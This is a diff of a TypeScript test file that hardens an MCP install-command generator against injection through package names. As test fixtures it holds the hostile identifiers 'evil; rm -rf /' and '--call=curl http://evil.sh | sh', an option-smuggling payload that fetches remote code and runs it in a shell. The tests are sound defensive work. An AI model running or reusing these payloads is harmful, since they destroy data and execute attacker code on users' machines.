@@ -71,19 +71,56 @@ test('a hostile npm identifier cannot produce a runnable command', () => {
   }
 });
 
-test('the JSON config blocks pass the identifier as an argv element, not a shell string', () => {
+test('the JSON config blocks pass the identifier as an argv element AFTER an option terminator', () => {
   const out = buildInstalls(srv({ npmPackage: 'evil; rm -rf /' }));
   const json = out.find((t) => t.json)!.json!;
   const parsed = JSON.parse(json);
-  // argv elements are exec'd directly by the client, never shell-interpreted.
-  assert.deepEqual(parsed.mcpServers.x.args, ['-y', 'evil; rm -rf /']);
+  // No shell is involved here, so quoting is irrelevant - but npx still parses argv for
+  // options, so the terminator is what makes an option-shaped identifier inert.
+  assert.deepEqual(parsed.mcpServers.x.args, ['-y', '--', 'evil; rm -rf /']);
 });
 
-test('every emitted command survives a round trip through the shell tokenizer', () => {
-  // Belt and braces: the quoted form must still name the original package.
+test('an option-shaped identifier cannot reach a runner as an option', () => {
+  // `npx -y '--call=<cmd>'` EXECUTES <cmd>: quoting makes it one shell token, and npx then
+  // parses that token as an option. Confirmed by running it. `--` is what actually stops it.
+  const payload = '--call=curl http://evil.sh | sh';
+  const out = buildInstalls(srv({ npmPackage: payload, pypiPackage: payload, dockerImage: payload }));
+  for (const t of out.filter((x) => x.command)) {
+    const idx = t.command!.indexOf(payload.slice(0, 8));
+    assert.ok(idx > 0, `payload absent from: ${t.command}`);
+    assert.ok(
+      t.command!.slice(0, idx).includes(' -- '),
+      `no option terminator before the payload: ${t.command}`,
+    );
+  }
+  for (const t of out.filter((x) => x.json)) {
+    const args: string[] = Object.values(JSON.parse(t.json!).mcpServers)[0] ? (Object.values(JSON.parse(t.json!).mcpServers)[0] as { args: string[] }).args : [];
+    assert.ok(args.includes('--'), `argv lacks a terminator: ${JSON.stringify(args)}`);
+    assert.ok(args.indexOf('--') < args.indexOf(payload), 'terminator must precede the payload');
+  }
+});
+
+test('shortName never yields an empty or option-shaped token', () => {
+  assert.equal(shortName_probe('ns/'), 'mcp-server');
+  assert.equal(shortName_probe('ns/!!!'), 'mcp-server');
+  assert.equal(shortName_probe('ns/--evil'), 'evil');
+});
+
+// shortName is module-private; exercise it through the rendered command.
+function shortName_probe(name: string): string {
+  const cmd = buildInstalls(srv({ name, npmPackage: 'pkg' })).find((t) => t.client === 'claude-code')!.command!;
+  return cmd.replace('claude mcp add --scope user ', '').split(' ')[0];
+}
+
+test('the rendered command is exactly this literal (no recomputation)', () => {
+  // Asserted against a hardcoded string on purpose. The previous version built its
+  // expectation by calling shellArg(), so it would have passed even if shellArg were the
+  // identity function - it tested nothing. Verified by hand:
+  //   npx -y -- 'weird pkg'\''name'   ->  argv[3] === "weird pkg'name"
   const pkg = "weird pkg'name";
   const out = buildInstalls(srv({ npmPackage: pkg }));
-  const cline = out.find((t) => t.client === 'cline')!.command!;
-  assert.equal(cline, `npx -y ${shellArg(pkg)}`);
-  assert.ok(cline.startsWith('npx -y '));
+  assert.equal(
+    out.find((t) => t.client === 'cline')!.command,
+    "npx -y -- 'weird pkg'\\''name'",
+  );
 });
